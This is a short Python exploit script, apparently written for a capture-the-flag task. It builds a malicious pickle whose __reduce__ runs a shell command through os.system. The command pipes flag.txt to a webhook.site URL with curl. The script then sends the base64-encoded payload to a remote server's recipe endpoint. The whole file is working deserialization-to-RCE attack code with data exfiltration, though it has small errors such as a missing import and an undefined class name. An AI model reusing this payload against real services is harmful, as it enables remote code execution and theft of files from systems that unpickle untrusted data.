import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('more flag.txt | curl -X GET --data-binary @- https://webhook.site/0cad5931-14e0-4bf5-b780-b3ed40d6a113?')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled))
    print(base64.urlsafe_b64encode(pickled))
    

def sploit(pickle):
    # encoded = base64.urlsafe_b64encode(pickle)
    encoded = pickle
    print(encoded)
    r = requests.get(
        f"http://tasks.mxkv.ru:31337/recipe",
        params={"recipe": encoded},
    )
    print(r.url)
    print(r.text)


if __name__ == "__main__":
    # print(pickletools.dis(payload))

    payload = base64.b64encode(pickle.dumps(PickleRCE()))
    sploit(payload)